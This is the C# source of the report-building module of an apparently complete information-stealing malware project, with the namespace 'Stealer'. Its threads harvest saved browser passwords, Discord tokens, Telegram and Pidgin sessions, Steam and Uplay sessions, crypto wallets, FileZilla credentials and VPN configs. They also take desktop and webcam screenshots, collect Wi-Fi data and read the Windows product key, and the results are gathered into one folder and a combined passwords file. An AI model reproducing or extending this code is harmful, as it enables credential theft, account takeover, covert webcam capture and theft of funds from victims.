using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using Stealer.Chromium;
using Stealer.Edge;
using Stealer.Firefox;
using Stealer.InternetExplorer;

namespace Stealer;

internal sealed class Report
{
	public static bool CreateReport(string sSavePath)
	{
		List<Thread> list = new List<Thread>();
		try
		{
			list.Add(new Thread((ThreadStart)delegate
			{
				FileGrabber.Run(sSavePath + "\\Grabber");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Stealer.Chromium.Recovery.Run(sSavePath + "\\Browsers");
				Stealer.Edge.Recovery.Run(sSavePath + "\\Browsers");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Stealer.Firefox.Recovery.Run(sSavePath + "\\Browsers");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					Stealer.InternetExplorer.Recovery.Run(sSavePath + "\\Browsers");
				}
				catch
				{
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Discord.WriteDiscord(Discord.GetTokens(), sSavePath + "\\Messenger\\Discord");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Pidgin.GetAccounts(sSavePath + "\\Messenger\\Pidgin");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Steam.GetSteamSession(sSavePath + "\\Gaming\\Steam");
				Uplay.GetUplaySession(sSavePath + "\\Gaming\\Uplay");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Minecraft.SaveAll(sSavePath + "\\Gaming\\Minecraft");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Wallets.GetWallets(sSavePath + "\\Wallets");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				FileZilla.WritePasswords(FileZilla.Steal(), sSavePath + "\\FileZilla");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				ProtonVPN.Save(sSavePath + "\\VPN\\ProtonVPN");
				OpenVPN.Save(sSavePath + "\\VPN\\OpenVPN");
				NordVPN.Save(sSavePath + "\\VPN\\NordVPN");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Directory.CreateDirectory(sSavePath + "\\Directories");
				DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
			}));
			Directory.CreateDirectory(sSavePath + "\\System");
			list.Add(new Thread((ThreadStart)delegate
			{
				ProcessList.WriteProcesses(sSavePath + "\\System");
				ActiveWindows.WriteWindows(sSavePath + "\\System");
			}));
			Thread thread = new Thread((ThreadStart)delegate
			{
				DesktopScreenshot.Make(sSavePath + "\\System");
				WebcamScreenshot.Make(sSavePath + "\\System");
			});
			thread.SetApartmentState(ApartmentState.STA);
			list.Add(thread);
			list.Add(new Thread((ThreadStart)delegate
			{
				Wifi.SavedNetworks(sSavePath + "\\System");
				Wifi.ScanningNetworks(sSavePath + "\\System");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				File.WriteAllText(sSavePath + "\\System\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry());
			}));
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				item2.Join();
			}
			string contents = File.ReadAllText(sSavePath + "\\Browsers\\Chrome\\Passwords.txt");
			string contents2 = File.ReadAllText(sSavePath + "\\Browsers\\Edge\\Passwords.txt");
			File.WriteAllText(sSavePath + "\\passwords.txt", contents);
			File.AppendAllText(sSavePath + "\\passwords.txt", contents2);
			return true;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return false;
		}
	}
}
